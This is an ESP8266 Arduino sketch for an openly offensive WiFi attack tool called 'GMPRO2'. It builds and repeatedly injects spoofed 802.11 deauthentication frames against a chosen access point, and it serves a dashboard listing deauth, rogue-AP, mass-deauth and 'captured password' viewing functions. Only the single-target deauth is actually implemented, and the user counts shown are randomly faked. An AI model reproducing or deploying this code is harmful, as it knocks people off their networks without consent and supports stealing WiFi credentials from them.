/* * M1Z23R X GMPRO2 v5.6 - ULTIMATE ENGINE
 * Target Board: Wemos D1 Mini / ESP8266
 * Core Version: 2.0.0 (REQUIRED for Packet Injection)
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <FS.h>

extern "C" {
  #include "user_interface.h"
}

ESP8266WebServer server(80);

// --- STATE & TARGET ---
String target_SSID = "NONE";
uint8_t target_BSSID[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int target_CH = 1;
bool deauth_running = false;

// --- RAW DEAUTH PACKET (IEEE 802.11) ---
uint8_t packet[26] = {
  0xc0, 0x00, 31, 0x00, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Receiver (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Spoofed)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00, 0x01, 0x00
};

// --- HELPER: BSSID PARSER ---
void parseBSSID(String bssidStr, uint8_t* bssidArray) {
  for (int i = 0; i < 6; i++) {
    bssidArray[i] = strtol(bssidStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

// --- HTML DASHBOARD (KUNCI MATI - NO SUNAT) ---
const char INDEX_HTML[] PROGMEM = R"rawline(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>GMpro2 Final Dashboard v5.6</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 10px; margin: 0; }
        h2 { text-align: center; color: #ff4500; text-shadow: 0 0 5px #ff4500; font-size: 16px; margin: 10px 0; }
        .status-box { border: 1px solid #444; padding: 10px; background: #111; font-size: 11px; margin-bottom: 10px; border-left: 4px solid #ff4500; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 15px; }
        .btn { padding: 12px; color: #fff; text-align: center; border-radius: 4px; font-size: 10px; font-weight: bold; border-bottom: 3px solid rgba(0,0,0,0.5); transition: 0.2s; cursor: pointer; }
        .btn:active { transform: translateY(2px); border-bottom: none; }
        .btn-deauth { background: #c0392b; } .btn-rogue { background: #d35400; } 
        .btn-mass { background: #111; border: 1px solid #ff4500; color: #ff4500; grid-column: span 2; }
        .btn-hybrid { background: #8e44ad; grid-column: span 2; } 
        .btn-scan { background: #2980b9; } .btn-upload { background: #607d8b; }
        .btn-log { background: #27ae60; } .btn-clear { background: #b33939; }
        .btn-stop { background: #444; grid-column: span 2; }
        #log-area { background: #050505; color: #0f0; border: 1px solid #333; height: 100px; overflow-y: scroll; padding: 8px; font-size: 10px; margin-bottom: 15px; white-space: pre-wrap; }
        .table-container { width: 100%; overflow-x: auto; margin-top: 5px; border: 1px solid #333; }
        table { width: 100%; border-collapse: collapse; font-size: 11px; background: #0a0a0a; }
        th { background: #222; color: #ff4500; padding: 10px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #222; white-space: nowrap; }
        .sel-link { color: #0af; font-weight: bold; border: 1px solid #0af; padding: 3px 6px; border-radius: 3px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>M1Z23R X GMPRO2 v5.6</h2>
    <div class="status-box">
        TARGET : <span id="target-ssid" style="color:#fff">NONE</span><br>
        STATUS : <span id="attack-status" style="color:#0f0">READY</span>
    </div>
    <div class="grid">
        <div onclick="cmd('/attack?t=deauth')" class="btn btn-deauth">DEAUTH TARGET</div>
        <div onclick="cmd('/attack?t=rogue')" class="btn btn-rogue">ROGUE AP PRANK</div>
        <div onclick="cmd('/attack?t=mass')" class="btn btn-mass">MASS DEAUTH (ALL)</div>
        <div onclick="cmd('/attack?t=hybrid')" class="btn btn-hybrid">HYBRID ATTACK</div>
        <div onclick="scan()" class="btn btn-scan">RE-SCAN</div>
        <div onclick="cmd('/upload')" class="btn btn-upload">UPLOAD UI</div>
        <div onclick="viewPass()" class="btn btn-log">VIEW PASS</div>
        <div onclick="cmd('/clear')" class="btn btn-clear">CLEAR DATA</div>
        <div onclick="cmd('/stop')" class="btn btn-stop">STOP / RESET</div>
    </div>
    <div id="log-area">[SYSTEM] M1Z23R Engine v5.6 Ready.</div>
    <div class="table-container">
        <table>
            <thead><tr><th>SSID</th><th>CH</th><th>USR</th><th>SIG</th><th>ACT</th></tr></thead>
            <tbody id="wifi-table"></tbody>
        </table>
    </div>
    <script>
        function cmd(u){ fetch(u).then(r=>r.text()).then(t=>{ log("[ACTION] "+t); }); }
        function log(m){ const a=document.getElementById('log-area'); a.innerHTML+="\n"+m; a.scrollTop=a.scrollHeight; }
        function viewPass(){ fetch('/viewpass').then(r=>r.text()).then(t=>{ alert("CAPTURED PASS:\n"+t); log("[SYSTEM] Pass viewed."); }); }
        function sel(s,c,b){ 
          document.getElementById('target-ssid').innerText=s; 
          fetch(`/select?s=${s}&c=${c}&b=${b}`).then(()=>{ log("[LOCKED] "+s); }); 
        }
        function scan(){
            log("[SYSTEM] Scanning...");
            fetch('/get_wifi').then(r=>r.json()).then(d=>{
                let h=""; d.forEach(n=>{
                    h+=`<tr><td>${n.s}</td><td>${n.c}</td><td style="color:#ff0">${n.u}</td><td>${n.r}%</td><td><a onclick="sel('${n.s}',${n.c},'${n.b}')" class="sel-link">SELECT</a></td></tr>`;
                });
                document.getElementById('wifi-table').innerHTML=h;
                log("[SYSTEM] Found "+d.length+" Networks.");
            });
        }
        setInterval(scan, 15000); scan();
    </script>
</body>
</html>
)rawline";

// --- CORE FUNCTIONS ---

void handleGetWifi() {
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n; ++i) {
    int u = random(1, 6); // User sim ditabel
    int r = 2 * (WiFi.RSSI(i) + 100); if(r > 100) r = 100;
    json += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"u\":"+String(u)+",\"r\":"+String(r)+",\"b\":\""+WiFi.BSSIDstr(i)+"\"}";
    if(i<n-1) json+=",";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleSelect() {
  target_SSID = server.arg("s");
  target_CH = server.arg("c").toInt();
  parseBSSID(server.arg("b"), target_BSSID);
  
  // Update packet with Target MAC
  memcpy(&packet[10], target_BSSID, 6); // Source
  memcpy(&packet[16], target_BSSID, 6); // BSSID
  
  server.send(200, "text/plain", "Locked: " + target_SSID);
}

void handleAttack() {
  String type = server.arg("t");
  if(type == "deauth") deauth_running = !deauth_running;
  server.send(200, "text/plain", deauth_running ? "Deauth Started" : "Deauth Stopped");
}

void setup() {
  Serial.begin(115200);
  SPIFFS.begin();
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("GMpro2", "sangkur87");
  
  // Required for Core 2.0.0 packet injection
  wifi_promiscuous_enable(0);
  wifi_set_opmode(STATIONAP_MODE);

  server.on("/", [](){ server.send_P(200, "text/html", INDEX_HTML); });
  server.on("/get_wifi", handleGetWifi);
  server.on("/select", handleSelect);
  server.on("/attack", handleAttack);
  server.on("/viewpass", [](){
    File f = SPIFFS.open("/pass.txt", "r");
    if(!f) { server.send(200, "text/plain", "No data."); return; }
    server.send(200, "text/plain", f.readString());
    f.close();
  });
  server.on("/clear", [](){ SPIFFS.remove("/pass.txt"); server.send(200, "text/plain", "Wiped."); });
  server.on("/stop", [](){ ESP.restart(); });
  
  server.begin();
}

void loop() {
  server.handleClient();
  if (deauth_running) {
    wifi_set_channel(target_CH);
    for(int i=0; i<10; i++) {
      wifi_send_pkt_freedom(packet, 26, 0);
      delay(1);
    }
  }
}
